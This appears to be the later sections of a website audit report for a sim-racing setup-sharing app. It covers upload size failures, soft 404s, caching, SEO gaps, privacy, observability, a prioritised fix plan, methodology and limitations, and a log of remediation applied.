- **Every `security definer` function pins `search_path`** (no privilege-escalation via schema shadowing), and `fulfill_setup_request` had its default `PUBLIC EXECUTE` revoked and re-granted to `authenticated` only. Service-role-only GC functions are likewise restricted.
- **Evidence-quality checks** on setup values (`is_valid_setup_values`), an account-deletion-request flow with a uniqueness constraint, a content-report flow with an anti-duplicate unique index, and a `LAST VALID`/hardening migration for data validation.
- **Authentication:** Discord OAuth via Supabase with PKCE (`exchangeCodeForSession`), server-side session refresh in middleware, `getUser()` (not `getSession()`) for identity checks, and an early-out that skips the Supabase round trip when no auth cookie is present. Hardened redirect handling. No ID/secret leakage.
- **Uploads:** extension allow-list + magic-byte validation + size caps + owner-folder path enforcement + sanitised stored filenames.

**Residual security items (all low/medium):**

1. **Anonymous, unthrottled `increment_downloads`** (see §3.2 #2) — write amplification and counter tampering, no security impact beyond integrity of a vanity metric.
2. **`img-src 'self' https:`** broadens an XSS's exfiltration options (§2.7).
3. **No CSP violation reporting** (`report-to`) — no visibility if the policy is too loose or too tight in the field.
4. **`frame-ancestors 'self'` vs `X-Frame-Options: DENY`** inconsistency (cosmetic).
5. **No rate limiting at the edge for Server Actions generally.** DB triggers cover uploads/comments/requests; upvotes, ratings, follows, favourites, notifications and export/download counters rely on nothing but DB constraints. A modest per-IP limiter in `src/proxy.ts` for non-GET requests would add defence in depth (and protect the Vercel bill).
6. **Not testable here:** authenticated/authorisation behaviour under a real session, Supabase project settings (redirect allow-list, Auth rate limits, email templates), Storage bucket policies in the live project, and whether the migrations in the repo are exactly what's applied in production.

### 3.5 Error handling & resilience

- **Error surfaces are user-friendly** (`error.tsx`, `global-error.tsx`, per-route `not-found.tsx` for setups and profiles, `/auth/auth-code-error`), and `getActionError()` maps Postgres codes (23505/23503/42501) to stable copy while logging the raw error — good practice that avoids leaking schema details.
- **The 1 MB Server Action limit is unhandled and violates the product's own stated limits — this is the highest-severity backend finding:**

```
UI/validation:  MAX_SETUP_FILE_BYTES = 5 MiB   MAX_TELEMETRY_FILE_BYTES = 10 MiB   (src/lib/storage.ts)
Framework:      serverActions.bodySizeLimit defaults to 1 MiB, not configured      (next.config.ts)
Platform:       Vercel caps serverless request bodies at ~4.5 MiB
Reproduction:   POST /upload  Next-Action: 408289166f582c58babcc288993e9b862d0d2de0e1
                with a 2 MiB and a 6 MiB multipart file →
                HTTP 500, digest '…@E394'
Server log:     Error: Body exceeded 1 MB limit.
                statusCode: 413, digest: '1781903092@E394'
```

  Because the bytes are proxied *through* the Server Action (`uploadSetupFile(FormData)` → function → Storage), even raising `bodySizeLimit` to 5/10 MB cannot work on Vercel; the 10 MB telemetry allowance is not implementable on this platform at all. **Fix = signed direct-to-Storage upload from the browser + a small Server Action to record the object path and validate ownership/extension/size afterwards.**
- **No circuit breaker / no degraded-mode UI.** A DB outage produces 7 s responses and then silently empty pages (cached, §3.3). There is no "we're having trouble loading setups" state, no retry with backoff, and no fallback content — the user cannot distinguish "no setups exist" from "the backend is down".
- **Framework-level 404s are correct** (`/totally-bogus-page` → 404) and the middleware correctly returns a hard `404` for non-UUID OG-image paths (a genuinely good fix).
- **But the page-level not-found path returns 200** (§2.1 / issue #3). The code comment in `src/app/setups/[id]/page.tsx:20-27` documents this as a deliberate tradeoff ("Next 16 exposes no supported way to set the status from a Server Component"). That reasoning is sound for the *render* phase — but the repository already contains the correct mechanism: **`src/proxy.ts` returns a real 404 for the OG route today.** Doing the same shape check (`isUuid`) for `/setups/:id` and `/profile/:id` in the proxy converts the most common soft-404 (junk/truncated links, and a large share of crawler noise) into a correct 404/410 with zero DB cost, leaving only valid-UUID-but-deleted rows on the noindex path.
- **No error alerting:** errors reach Vercel's log stream as JSON lines (`src/lib/logger.ts`) and nowhere else. Nobody is paged; nobody sees a 500/413 spike.

### 3.6 Scalability & infrastructure clues

- **Hosting:** Vercel (multi-region edge for static/CDN, `iad1` observed for computed responses). Static assets are immutable-cached for a year; HTML is never cached.
- **Render model is the bottleneck.** With uncacheable HTML, cost scales linearly with traffic: every page view = 1 function invocation + (anonymous) 1–3 PostgREST queries, or (authenticated) ~5 queries + hydration of 300+ KiB of JS. A traffic spike is a Supabase connection/CPU spike and a Vercel bill spike simultaneously.
- **Data layer:** Supabase Postgres with good indexing (btree on `(created_at desc, id desc)`, `(user_id, created_at desc, id desc)`, GIN trigram on searchable text, partial/unique indexes on workflow tables) and a `leaderboard` view + `setup_search` view + `most_wanted` aggregate. Denormalised counters (`upvotes`, `downloads`, `rating_count`) are maintained by triggers, which keeps reads cheap. Watch items: the per-request `count(*)` for the unread badge and the total setup count (fine at this scale, needs care later), and trigger-maintained counters (hot-row contention on popular setups).
- **Images/OG:** Satori rendering per distinct setup OG URL is CPU-heavy per cold render but edge-cached for 24 h; with the proxy guard in place the "unbounded free image generator" risk is closed. Self-hosting the OG fonts would remove the remaining external dependency and cold-start cost.
- **No queueing/background work** for image generation, GC, or notification fan-out — the GC functions exist as service-role SQL (`orphaned_setup_files`) and therefore need a scheduler (Supabase cron or a Vercel cron) which is not present in the repo. Confirm something is actually calling it, or abandoned objects accumulate silently.
- **Fingerprints:** `Server: Vercel` + Next.js RSC payload + `X-Matched-Path` headers. Nothing sensitive is exposed; `X-Powered-By` is suppressed.

---

## 4. Cross-Cutting Concerns

### 4.1 Technical SEO foundation

**Working well:** per-page `alternates.canonical`; a correct `robots.txt` (disallows `/setups/*/edit`, `/auth/`, `/account/`, `/report`, declares the sitemap); a dynamic `sitemap.xml` with `lastModified`, prioritised static routes, a 50 000-URL guard, and hourly revalidation; `noindex,nofollow` on private/utility routes (`/profile`, `/report`, `/account/data-deletion`, `/setups/compare`, not-found branches); OpenGraph + Twitter cards with a generated 1200×630 image; JSON-LD coverage: `Organization` + `WebSite`+`SearchAction` (global), `CollectionPage`+`ItemList` (`/setups`, `/requests`), `ItemList`+`Person` (leaderboard), `Article`+`BreadcrumbList` (setup detail) with `isAccessibleForFree`, `dateModified`, `inLanguage`, keywords; `www` → apex redirect; HTTPS-only with HSTS preload.

**Gaps:**

1. **Soft 404s** (§2.1/§3.5): `noindex` prevents indexing but the URLs still return 200, still consume crawl budget, and appear in Search Console as "Excluded by noindex" rather than dropping out. The sitemap continues advertising deleted setups until `revalidateTag('setups-sitemap')` fires on the delete (which it does) — so the practical exposure is junk/typo URLs, not deleted content.
2. **No indexable landing pages for the highest-intent queries.** All filtering happens client-side and `/setups` carries a single static canonical, so `?game=iRacing`, `?game=Assetto%20Corsa%20Competizione`, `?track=Monza…` are *not* rankable. The site therefore competes for "sim racing setups" (a head term it can't win pre-launch) instead of "iRacing setups", "ACC Monza setup", "F1 25 setups" — long-tail intents it owns the content for. This is the biggest SEO upside in the audit.
3. **No `AggregateRating` structured data** despite first-party 1–5 pace/predictability ratings on every setup with a visible rating count — the setup detail page is the exact shape Google rewards with stars in results.
4. **No `ProfilePage`/`Person` markup on `/profile/[userId]`** (only the leaderboard has `Person`), and **no `SoftwareApplication`/`VideoGame` entities** for the 8 supported titles (a natural topical-authority signal).
5. **Blocked-but-linked `/report?…` URLs**: every setup card links to `/report?type=setup&id=…` while `robots.txt` disallows `/report`. Harmless for ranking but it wastes crawl budget on blocked URLs; `rel="nofollow"` or rendering the link client-side only would tidy it.
6. **Search-result pages are indexable by form** (`/setups?q=…`) — protected by the canonical, but adding `noindex` when `q` is present would be tidier.
7. **Index footprint is tiny** (28 sitemap URLs, 20 setups) and no Search Console/analytics access was available to check real coverage, impressions or query mix. That data is the fastest way to prioritise the category-page work.

### 4.2 Privacy & compliance signals

- **No tracking scripts, no third-party cookies, no ad tech, no fingerprinting** — verified by absent dependencies and by inspecting every network-visible origin in rendered pages. `Permissions-Policy` disables camera/mic/geolocation; `Referrer-Policy` is `strict-origin-when-cross-origin`; avatars use `no-referrer`; only functional Supabase session cookies are set (server-side, `HttpOnly`/`Secure`/`SameSite` by `@supabase/ssr`) — **cookie flag verification from outside is not possible** (cookies are not set on anonymous responses), which is a limitation to close with a browser session.
- **Because there is no tracking, the site arguably needs no cookie banner** — the correct compliance position for a product with users in the EU, and a genuine trust/adoption advantage to advertise ("no trackers, no cookie wall").
- **Real privacy/compliance gaps:**
  1. **Removing a setup does not remove the uploaded file** (prior audits flagged orphaned Storage objects; the GC function exists but is not wired to a scheduler in this repo). For a GDPR/CCPA-style deletion request the *file* must go too — `orphaned_setup_files` should run on a schedule and the account-deletion flow should delete the user's objects, not just rows.
  2. **Upload drafts are persisted in `localStorage`** per user (`setups-browser.tsx`, `upload-form.tsx`) and cleared on submit. On a shared/public PC (a plausible context for sim-racing communities — sim rigs are often shared) a draft including partial setup values/description survives a session. Worth a "drafts are stored on this device" note or a shorter TTL.
  3. **No data-retention statement** in `/privacy` about uploaded files, versions, telemetry and comment history (public-facing copy review, not verifiable from outside).
  4. `localStorage` for filters/drafts is also a signal that no consent-gated storage is needed — consistent with the no-tracker stance.

### 4.3 Maintainability & technical debt

**Strong:** clear module boundaries (`lib/supabase/*` readers, `lib/actions/*` writers, `components/*` UI) with unusually good explanatory comments (the *why* is documented at the decision site — CSP compromises, cache-tag granularity, dynamic-streaming 404 rationale, RSC boundary costs); `database.types.ts` generated schema types; 30 test files / **146 passing tests**; `npm run lint` and `npx tsc --noEmit` both **clean**; CI runs lint → typecheck → unit tests → build → bundle budget → `npm audit --audit-level=high` → Playwright E2E → **a real Postgres 16 job that applies all 29 migrations and runs the SQL tests** (of which this repo has 27 unit-test files and a `supabase/testing/*.test.sql` suite — notably better than most projects at this stage); Dependabot configured; a documented operations/launch checklist.

**Debt found:**

1. **Dependency advisories present but below the CI gate:** `npm ci` reports **2 moderate** advisories (`vitest` ← `@vitest/mocker`, GHSA-82fw-gwwq-j7x9, dev-only). CI fails only on high/critical, so this passes — correct policy, but the pin should be bumped.
2. **Oversized components:** `upload-form.tsx` 797 LOC, `setup-card.tsx` 658, `setups-browser.tsx` 598 — the first two are the most-changed and least-testable files in the app (upload flow has no component test; the browse grid has one).
3. **Duplicated/derived logic in several places** (row→`Setup` mapping, filter parsing on client and server, tag/condition normalisation) — a handful of `lib/` helpers exist but the audit found parallel copies in the previous pass too.
4. **Stale documentation:** the README/proxy comments still describe "next/font self-hosted fonts" (no webfont is loaded) and the README's page inventory lags the code (comments, versions, favourites, reports, export, compare all exist). Docs that describe non-existent behaviour cost real debugging time.
5. **Dead assets** (`public/*.svg` starter files) and **no `.env` documentation** beyond two variables.
6. **`content-visibility` fixed intrinsic size** (§2.2) — a performance optimisation that can regress CLS; needs measurement to keep.
7. **No `LICENSE`/contribution guide** while the footer/terms link to the GitHub repo as the support channel — a small adoption friction for the "community-driven" positioning.

### 4.4 Observability (how debuggable is this from the outside?)

**From outside (this audit's view):** headers are informative (`X-Vercel-Cache`, `X-Matched-Path`, `X-Vercel-Id`), error pages are branded and distinguishable, `/robots.txt`/`/sitemap.xml` are correct, and the OG-image guard means junk URLs return a clean 404. An external auditor can form a good picture — which is itself a sign of quality.

**For the team (the gap):**

| Signal | Available today | Needed |
|---|---|---|
| Field Core Web Vitals (LCP/INP/CLS per route) | **None** | `@vercel/speed-insights` or a `web-vitals` beacon to any endpoint |
| Usage/funnel analytics | **None** | privacy-friendly analytics (Plausible/Umami/PostHog without autocapture) |
| Error tracking/alerting | stdout JSON only (Vercel log retention) | Sentry/Bugsnag or Vercel log drains + an alert rule on 5xx and 413 |
| CSP violations | **None** | `report-to`/`report-uri` + a collector route |
| Uptime/latency synthetic checks | **None** | external synthetic monitor on `/`, `/setups`, `/setups/[id]` |
| DB/latency dashboards | Supabase dashboard only (not visible here) | Supabase metrics + a PostgREST latency alert; log the `fetchWithTimeout` abort rate |
| Deploy health | CI gates (strong) | add a post-deploy smoke check (the E2E suite already exists — point it at production) |

Concretely: **the 1 MB upload failure and the 7 s DB-timeout path would both be caught on day one by basic error alerting and a single synthetic check.** That is the highest-leverage infrastructure investment in this report.

---

## 5. Prioritized Action Plan

### Critical — fix this week

| # | Item | Impact | Effort | Owner | Recommendation |
|---|---|---|---|---|---|
| C1 | **Uploads > 1 MB return 500** | High | **Med** | BE | Switch to **Supabase signed direct-to-Storage uploads** from the browser (`createSignedUploadUrl`), then a small Server Action that records `{path, fileName}` and re-validates ownership/extension/size. Interim stop-gap: set `experimental.serverActions.bodySizeLimit` to ~4 MB and lower the advertised caps to match (but note Vercel's ~4.5 MB body ceiling makes 10 MB telemetry impossible via the function). Also surface a friendly "file too large" error instead of a 500. |
| C2 | **Soft 404s return 200** | High | **Low** | BE | Extend the existing `src/proxy.ts` pattern (it already returns a hard 404 for non-UUID OG paths) to `/setups/:id` and `/profile/:id`: return **404/410** when the segment is not a UUID. Keep `noindex` for valid-UUID-but-deleted rows and consider a KV/Supabase-cached existence check in middleware to make those 404 too. |
| C3 | **Contrast failures in the default theme** | High | **Low** | FE | Re-tune `--racing-red` and `--destructive` lightness for ≥4.5:1 on card/muted/background in dark mode (they need roughly +0.06–0.10 OKLCH lightness); raise the light-theme focus ring alpha/lightness to ≥3:1 (currently 1.56:1). Re-verify card/muted/background for every `text-racing-*`/`text-destructive` usage. |
| C4 | **No production error/uptime visibility** | High | **Low** | Both | Add error tracking (or a Vercel log drain + alert on 5xx/413) and one synthetic check per route. Without this, C1/C5-class regressions ship silently. |
| C5 | **DB failure = 7 s render + cached empty page** | High | **Med** | BE | Add a circuit breaker/health flag so a failing DB renders a "setups are temporarily unavailable" state instead of `[]`; **never cache a failure** (throw inside the `unstable_cache` callback so the error path bypasses the cache); consider lowering the 5 s per-query timeout (~2 s) and retrying once. |

### High — next 2–4 weeks

| # | Item | Impact | Effort | Owner | Recommendation |
|---|---|---|---|---|---|
| H1 | **HTML is never cacheable; every view is a full SSR** | High | **High** | BE/FE | Split the personalised shell: move `SiteHeader`'s auth/notification needs behind a `<Suspense>`-wrapped client island (or render the public header statically and hydrate the auth affordances), so anonymous HTML can be served with `s-maxage`/PPR. Measure before/after TTFB and Vercel function invocations. |
| H2 | **No indexable category pages** | High | **Med** | FE/BE | Add server-rendered, canonical, indexable routes for the top intents (`/setups/[game]`, optionally `/setups/[game]/[track]`), each with unique title/description, `ItemList` JSON-LD, and a real `<h1>`; add them to the sitemap and link the existing homepage chips to them instead of `?query` URLs. |
| H3 | **JS payload 313–326 KiB gzip per route; 500-row client index** | High | **Med** | FE | Shrink the browse payload: server-side paginate + filter (keep the URL as the source of truth), cap initial render at ~24 cards, and move the per-card sub-clients (comments/history/rating) behind `next/dynamic`. Target < 200 KiB gzip per public route and set the budget script to measure *per-route* weight, not build total. |
| H4 | **No skip link; decorative avatars announced twice; sticky-header focus obscuring** | Med | **Low** | FE | Add a skip-to-content link as the first focusable element, set `alt=""` on avatars adjacent to their name, and keyboard-test focus visibility under the sticky header (SC 2.4.11). |
| H5 | **Anonymous download counter is unthrottled** | Med | **Low** | BE | Add per-IP/session throttling for non-GET Server Actions in `src/proxy.ts` (or debounce in the UI) and consider revoking default `PUBLIC EXECUTE` on `increment_downloads` in favour of an RPC that checks a signed token/session. |
| H6 | **Anonymous visitors get a cold, uncached render of the same content for everyone** | Med | **Med** | BE | Once H1 lands, verify with `curl -I` that anonymous HTML returns `public, s-maxage=…` and `X-Vercel-Cache: HIT` on repeat, and that authenticated responses stay `private, no-store`. |
| H7 | **OG images depend on live Google Fonts; edge staleness up to 8+ days** | Med | **Low** | BE | Self-host the two OG fonts (Inter 400/600/700, JetBrains Mono 500) as repo assets and drop the runtime fetch; reduce `stale-while-revalidate` (e.g. `s-maxage=86400, swr=86400`) and stop echoing `Vary: rsc,…` on image responses. |

### Medium — lower priority / continuous

| # | Item | Impact | Effort | Owner | Recommendation |
|---|---|---|---|---|---|
| M1 | No RUM for Core Web Vitals | Med | Low | FE | `@vercel/speed-insights` (or `web-vitals` → own endpoint) with per-route attribution; then re-measure the `content-visibility: auto` intrinsic-size guess (CLS risk) and the real LCP element. |
| M2 | Trending rows/loading states | Med | Low | FE | Add `loading.tsx` for `/setups/[id]` (the top landing page from search) and `/profile/[userId]` streaming skeletons matching final layout. |
| M3 | Print stylesheet missing | Med | Low | FE | `@media print` for `/setups/[id]`: white ground, hide nav/footer/buttons, render setup values as a clean table. Core workflow value for a tuning-sheet site. |
| M4 | `AggregateRating` + richer entity markup | Med | Low | FE | Add `AggregateRating` (ratingCount from the DB) to the setup `Article`/`CreativeWork` graph, `ProfilePage`+`Person` on public profiles, and `VideoGame` entities for the 8 titles. |
| M5 | No webfont despite declaring Inter/JetBrains Mono | Med | Low | FE | Either self-host Inter via `next/font/local` (subset, `display: swap`, 1–2 weights) or remove the font names from the tokens so the declared brand matches the rendered brand — and update the README/proxy comments. |
| M6 | Avatar images are unoptimised third-party requests | Low/Med | Med | FE | Proxy Discord avatars through `next/image` (add `images.remotePatterns` for the CDN) or mirror them into Supabase Storage at sign-in; keeps third-party latency/caching out of the critical path. |
| M7 | Broad `img-src 'self' https:` | Low/Med | Low | BE | Narrow to the actual avatar/Storage origins; add CSP `report-to` with a collector route. |
| M8 | Anonymous write endpoints + no edge rate limiting | Med | Med | BE | Per-IP limiter for non-GET actions; keep downloads open but bounded. |
| M9 | Deletion does not remove Storage objects; no scheduled GC | Med | Med | BE | Wire `orphaned_setup_files` + user-object deletion into the account-deletion flow and a cron schedule; document the retention window in `/privacy`. |
| M10 | Dependency drift (2 moderate dev advisories) | Low | Low | Both | Bump `vitest`/`@vitest/mocker`; keep the `npm audit --audit-level=high` gate and add a monthly `--omit=dev` check to the docs. |
| M11 | Dead starter assets; no PWA/mobile chrome metadata | Low | Low | FE | Delete `public/{file,globe,next,vercel,window}.svg`; add `theme-color`, `apple-touch-icon` (`180×180`), and a minimal `manifest.webmanifest`. |
| M12 | Inconsistent `global-error` branding; no support path on error pages | Low | Low | FE | Use the brand tokens in `global-error.tsx` and add a "report it / join Discord" link plus the error digest to both boundary pages. |
| M13 | Malformed `Link: ; rel=preload; as="style"` header | Low | Low | BE | Verify against the latest Next 16 patch; if it persists, report upstream (it is a no-op wasted hint, not a regression). |
| M14 | Search unreachable 768–1279 px; 10 px kbd hint | Low/Med | Low | FE | Show the search input from `md` (or add an icon button that opens the same input); bump the shortcut hint to `text-xs`. |
| M15 | Test coverage on the riskiest files | Med | Med | Both | Extract the upload pipeline into testable units (file validation, signed-URL request, size/extension enforcement) and add a component test for the >1 MB path; add an E2E that asserts a real 404 status for junk setup IDs. |

**Suggested sequencing:** C1 → C4 (so the rest is measurable) → C2/C3 (cheap wins) → H1/H6 (the big performance lever) → H2 (growth) → C5/H3/H5 → M-items in the background.

---

## 6. Evidence & Methodology

### What was actually run

| Method | Detail |
|---|---|
| Live HTTP probing (external) | `api.hackertarget.com/httpheaders` for `https://setupsheet.app/`, `/setups`, `/setups/not-a-uuid`, `/setups/31bcad00-…`, `/setups/31bcad00-…/opengraph-image`, `/opengraph-image`, `https://www.setupsheet.app/`, `http://setupsheet.app/` — status codes, full header sets, redirect chains, cache state (`X-Vercel-Cache`, `Age`), CSP per request |
| Live content retrieval | Rendered-text retrieval of `/`, `/robots.txt`, `/sitemap.xml` (28 URLs enumerated), plus repeated header probes for cache-state confirmation |
| Local production build | `npm ci` (535 packages) → `npm run build` (Next 16.3.3, Turbopack; 22 routes — 18 dynamic `ƒ`, 4 static `○`) → `npx next start -H 0.0.0.0 -p 3100` against placeholder Supabase credentials (so failure paths were exercised deliberately) |
| Server-behaviour probes | 16-path status/size/time sweep; TTFB measurement; header inspection; static-asset cache headers; byte-level analysis of rendered documents (inline RSC bytes, script/CSS graphs, zero `<h1>` confirmation on the soft-404 page) |
| Payload measurement | Per-route gzip sums of the exact `<script src>` set in each rendered document, plus whole-build chunk gzip ranking |
| Empirical upload test | Multipart `POST` with `Next-Action: 408289166f582c58babcc288993e9b862d0d2de0e1` (resolved to `uploadSetupFile` from `.next/server/server-reference-manifest.json`) at 1 KB / 2 MiB / 6 MiB, cross-checked against server logs (`Body exceeded 1 MB limit`, `statusCode: 413`, digest `…@E394`) |
| Static analysis | Full read of `next.config.ts`, `src/proxy.ts`, `layout.tsx`, all `lib/supabase/*`, `lib/actions/*`, error/not-found/auth-callback routes, `seo.ts`, `site.ts`, `sitemap.ts`, `robots.ts`, cache-tags, storage/file-validation, key components, and all 29 SQL migrations (RLS policies, column grants, triggers, RPCs, indexes, `security definer` + `search_path`) |
| Quality gates | `npm run lint` (clean) · `npx tsc --noEmit` (clean) · `npx vitest run` (**30 files / 146 tests passed**) · `node scripts/check-performance-budget.mjs` (pass, 403.6 KiB / 36 chunks) · `npm audit` (**2 moderate, dev-only**) |
| Contrast computation | OKLCH → OKLab → linear sRGB → WCAG relative luminance implementation, including alpha compositing for the focus ring and border tokens; every token pair from `globals.css` in both themes |
| CI review | `.github/workflows/ci.yml` (lint, typecheck, test, build, budget, `npm audit --audit-level=high`, Playwright E2E, Postgres 16 migration job) and `.github/dependabot.yml` |

### Limitations (please read before acting on any number)

1. **No browser was available.** Chromium could not be downloaded (only the npm registry is reachable from this sandbox; `cdn.playwright.dev` and Google storage are not), so **no Lighthouse/axe run, no real CWV lab measurement, no keyboard or screen-reader pass, and no mobile viewport testing**. The 8 Playwright specs and `npm run test:e2e` could not be executed.
2. **No PageSpeed Insights / CrUX data.** The PSI API returned `429 quota exceeded` without an API key, third-party Lighthouse proxies were unreachable, and this origin is very unlikely to have CrUX field data yet (20 setups). **CWV statements here are structural/measured-from-the-wire, not lab or field scores.**
3. **No source of truth for production state.** No Vercel/Supabase dashboard, no Search Console, no analytics, no server logs beyond the local build, no knowledge of the Vercel plan's function limits, timeouts or regions; whether the repo's migrations match the live database is unverified.
4. **No authenticated testing.** All signed-in flows (notifications, upvotes, comments, follows, favourites, edit, data deletion, report submission) were reviewed as code, not exercised. Cookie flags (`HttpOnly`/`Secure`/`SameSite`), session-refresh behaviour and RLS enforcement under a real JWT remain to be verified in a browser.
5. **Local probes used placeholder Supabase credentials**, which made every data path fail — excellent for testing degradation (that is where the 7 s TTFB and the cached-empty-result behaviour came from) but it means local HTML/byte figures are for *empty-data* pages. Live pages with 20 setups are larger; the *ratio* of RSC payload to markup is representative, absolute KB is a floor.
6. **Brotli support, HTTP/2-vs-HTTP/3, TLS/certificate configuration, and third-party origin behaviour (Discord CDN)** could not be verified from this vantage point.
7. **Timings are single-sample** from one region via an HTTP proxy, not a controlled WebPageTest-style run.

### Tools to apply next (recommended, in order)

`Lighthouse` (mobile + desktop, per template) or **PageSpeed Insights with a project API key** → `@vercel/speed-insights` + `web-vitals` RUM (field data per route) → `WebPageTest` (multi-region, cache-warm/cold, filmstrip + TTFB waterfall) → `webpagetest.org` "Repeat View" for cache-hit behaviour after H1 → `axe DevTools` + manual keyboard script → **Google Rich Results Test** for the setup detail and `/setups` pages → **Search Console** coverage report (to quantify soft-404/`noindex` exclusions and the query mix that should drive H2) → `securityheaders.com`/`Mozilla Observatory` score (expect A/A+) → `CSP Evaluator` on the live policy → Supabase dashboard (slow query log, replication/connection metrics) → an authenticated browser pass for cookie flags and RLS behaviour.

---

## 7. Next Steps

### Recommended order of work

1. **This week — stop the bleeding and start measuring.**
   - **C1** upload path (direct-to-Storage) + a friendly size error.
   - **C4** error tracking + one synthetic check per template (so C5/H1 improvements are provable).
   - **C2** real 404s from `src/proxy.ts` (≈20 lines, closes a live SEO/UX defect).
   - **C3** the contrast token pass; **alt=""** on decorative avatars; skip link (an afternoon, closes the WCAG AA surface).
2. **Next 2–4 weeks — the performance and growth levers.**
   - **H1/H6** make anonymous HTML cacheable; verify `X-Vercel-Cache: HIT` + `s-maxage` on repeat anonymous requests and that authenticated HTML stays `no-store`. Re-measure with Lighthouse before/after.
   - **H2** indexable game/track landing pages (do this *before* chasing any other marketing work — it is the compounding one).
   - **C5** circuit breaker + honest degraded UI + stop caching failures.
   - **H3** per-route JS budget and server-side browse pagination.
3. **Then — hardening and polish.** H4/H5/H7, then the M-list (print stylesheet, `AggregateRating`, webfont decision, avatar proxying, avatar/PWA metadata, GC scheduling, dependency bumps, docs refresh).

### Quick wins vs. structural improvements

- **Quick wins (hours, no architecture change):** C1's interim limit, C2 proxy 404s, C3 contrast tuning, skip link, `alt=""`, `loading.tsx` for `/setups/[id]`, `AggregateRating`, print stylesheet, delete `public/*.svg`, `theme-color`/`apple-touch-icon`, `global-error` branding, `www` → 308, dependency bumps, docs corrections (the "next/font" claim).
- **Structural (plan and test deliberately):** signed direct-to-Storage uploads; cacheable/PPR rendering with a personalised shell; server-side filtering + pagination for browse; indexable category pages; RUM + error tracking; circuit-broken data layer with degraded-mode UI; OG font self-hosting.

### Follow-up audits / access that would strengthen this

1. **Authenticated browser session** — cookie flags, session refresh, RLS enforcement per role, notification/badge correctness, upload E2E at 0.5/1/4/8 MB, and the real post-login TTFB.
2. **Search Console + analytics access** — coverage/indexing reality (soft-404 and `noindex` counts), query mix (to rank-order H2's category pages), and the browse→download conversion funnel.
3. **Vercel + Supabase dashboards** — function duration/error rates, the plan's body-size and execution limits, PostgREST latency and slow-query log, Storage object counts vs. referenced paths (orphan measurement), and whether anything is actually scheduling the GC functions.
4. **A run of the repo's own suites with network access** — `npm run test:db` (SQL/RLS regressions) and `npm run test:e2e` (8 specs) have not been executed in this environment; they are the fastest way to falsify several "inferred" statements above.
5. **Post-fix verification pass** — repeat the exact probes used here (status sweep, header/cache checks, per-route gzip sums, 2 MiB upload test, contrast computation) so improvements are measured against a fixed baseline rather than asserted.

---

### Appendix A — Key measurements at a glance

```
Routes .................. 22 total (18 dynamic ƒ / 4 static ○)
HTML cacheability ....... private, no-cache, no-store + X-Vercel-Cache: MISS (all page URLs)
Static assets ........... public, max-age=31536000, immutable  ✓
Homepage ................ 59.2 KiB HTML (55.5% inline RSC) · 17 JS files · 313.4 KiB gzip JS · 12.1 KiB gzip CSS
/setups ................. 49.3 KiB HTML (43.9% inline RSC) · 19 JS files · 325.8 KiB gzip JS
Whole build ............. 391.5 KiB gzip JS/CSS across 35 chunks (largest 71.5 KiB gzip)
DB-unreachable TTFB ..... 7.05–7.32 s on data pages (5 s per-query timeout, no circuit breaker)
Soft 404s ............... /setups/not-a-uuid 200 · /setups/<missing> 200 (0 <h1>, no visible copy) · /profile/not-a-uuid 200
Real 404s ............... /totally-bogus-page 404 · /setups/not-a-uuid/opengraph-image 404 (proxy guard ✓)
Upload limit ............ 2 MiB & 6 MiB → HTTP 500, log: "Body exceeded 1 MB limit", statusCode 413 (E394)
Claimed upload limits ... 5 MiB (setup) / 10 MiB (telemetry) — unimplementable through the function on Vercel
OG image ................ 200 image/png 65,014 B · s-maxage=86400 + swr=604800 · X-Vercel-Cache HIT · Age 842,720 s (9.75 d)
Third-party scripts ..... none · external origins: cdn.discordapp.com (img), fonts.googleapis.com (OG render only)
DB authorisation ........ RLS on all content tables + column-level INSERT/UPDATE grants + trigger rate limits (20/h uploads, 60/h comments, 10/day requests)
Tests / gates ........... 146 unit tests pass · lint & tsc clean · npm audit: 2 moderate (dev) · CI: lint/typecheck/test/build/budget/audit/E2E/Postgres-16
Contrast failures ....... racing-red 3.62–4.14:1 · destructive 3.05–3.49:1 (dark, need 4.5) · light-theme focus ring 1.56:1 (need 3.0)
Observability ........... no RUM, no analytics, no error tracking, no CSP reporting, no uptime checks
```

---

## 8. Remediation applied (same day, branch `arena/01a0c4f6-setupsheet`)

All seven headline findings were worked on in this pass. Gates after the changes: `npx tsc --noEmit` clean · `npm run lint` clean · **`npx vitest run` 37 files / 218 tests pass** (up from 30/146) · `npm run build` passes (22 routes + `/api/csp-report`) · `scripts/check-performance-budget.mjs` passes (403.6 → 405.9 KiB gzip total, i.e. +2.3 KiB for the new telemetry).

| # | Finding | Status | Change | Verification |
|---|---|---|---|---|
| 1 | Uploads > 1 MB returned 500 (`Body exceeded 1 MB limit`) | **Fixed** | Uploads no longer transit the Server Action: `createUploadTarget` mints a Supabase signed upload URL, the browser PUTs via `uploadToSignedUrl`, and `verifyUploadedFile` re-checks size/ownership/extension against what Storage reports. New pure validation module `src/lib/upload-targets.ts` shared by browser + action. Set `experimental.serverActions.bodySizeLimit: "2mb"` as headroom so any future oversized POST is a deliberate 413, not a silent 1 MB cutoff. Also removed the browser client's 5 s request timeout, which would have aborted any real upload. | Log now shows `Body exceeded 2mb limit` (was `1 MB`); action manifest confirms `uploadSetupFile`/`uploadTelemetryFile` are gone and `createUploadTarget`/`verifyUploadedFile` present; 23 new tests (`upload-targets.test.ts` ×2 files) cover auth gating, owner-scoped paths, oversize/extension rejection, and foreign-path rejection **before** Storage is touched |
| 2 | Soft 404s returned HTTP 200 | **Fixed** (junk ids) | `src/lib/id-route-guard.ts` + a guard in `src/proxy.ts` answer a real 404 before any render for `/setups/<non-uuid>`, `/setups/<non-uuid>/edit` and `/profile/<non-uuid>`. `payload-budget`-style regression test pins the reserved static sibling (`/setups/compare`) that a naive guard would have 404'd. | Live: `/setups/not-a-uuid` **404**, `/profile/not-a-uuid` **404**, `/setups/not-a-uuid/edit` **404**; `/setups/compare`, `/setups`, `/leaderboard` etc. still 200. Valid-UUID-but-deleted setups still render the `noindex` page (200) — a real 404 there needs an existence check in the proxy, which requires a DB round trip per request |
